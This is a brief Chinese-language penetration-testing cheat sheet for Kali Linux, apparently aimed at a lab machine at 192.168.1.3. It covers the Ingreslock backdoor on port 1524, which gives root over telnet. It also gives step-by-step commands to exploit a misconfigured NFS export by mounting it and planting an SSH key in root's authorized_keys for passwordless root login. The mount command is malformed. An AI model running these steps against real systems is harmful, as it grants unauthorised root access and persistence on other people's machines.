# Kali Linux #
## Ingreslock后门漏洞 ##
**Port**: 1524  
telnet直接获取Root权限
## Linux NFS共享目录配置漏洞 ##
Step1：查看目标主机上NFS服务是否开启：   
```
rpcinfo -p 192.168.1.3   
```   
Step2:显示指定的远程共享目录列表：   
```
showmount -e 192.168.1.3
```   
Step3:生成rsa公钥：   
```
ssh-keygen
```   
Step4:
```
mkdir /tmp/tool 建立tool目录   
mount -t nfs 192.168.1.3:/tmp/tool,把192.168.1.3根目录挂载到/tmp/tool目录下   
```    
Step5：把生成的公钥追加到靶机的authorized_keys下，实现ssh免密码登录：
```
cat  /root/.ssh/id_rsa.pub>>/tmp/tool/root/.ssh/authorized_keys
```
Step6:连接
```
ssh root@ip
```